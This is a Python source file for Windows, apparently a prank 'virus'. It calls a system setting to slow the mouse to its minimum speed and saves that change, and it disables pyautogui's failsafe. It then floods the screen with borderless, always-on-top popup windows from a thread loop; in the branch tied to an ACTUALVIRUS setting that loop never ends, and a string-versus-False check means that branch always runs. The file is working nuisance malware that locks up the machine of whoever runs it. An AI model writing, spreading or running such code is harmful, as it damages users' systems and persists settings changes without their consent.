from tkinter import *
import tkinter as tk
import threading
import random
import pyautogui as win
import os
import ctypes as cty
from dotenv import load_dotenv
load_dotenv('.env')

win.FAILSAFE = False
class popupGenerator():
    def __init__(self):
        self.count = os.getenv('POPUP_COUNT')
        self.test = os.getenv('ACTUALVIRUS')
        self.message = os.getenv('POPUP_MESSAGE')
        pass
    
    def disable_event():
        pass

    def move_window(self):
        root = Tk()
        root.overrideredirect(True)

        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0,root.winfo_screenheight())
        root.resizable(0,0)
        root.geometry(f'400x50+{x}+{y}')

        message = Label(root,text=self.message,
                    font='ARIALBLACK 12',fg='Red')
        message.pack(expand=True)

        root.call('wm', 'attributes', '.', '-topmost', '1')
        
        root.mainloop()

    def start_popups(self,count):
        if __name__ != '__main__':
            cty.windll.user32.SystemParametersInfoA(0x0071,0,1,0x01|0x02) #ralentizar el mouse
            if self.test == False:
                for i in range(count):
                    thread = threading.Thread(target=self.move_window)
                    thread.start()
            else:
                while True:
                    thread = threading.Thread(target=self.move_window)
                    thread.start()
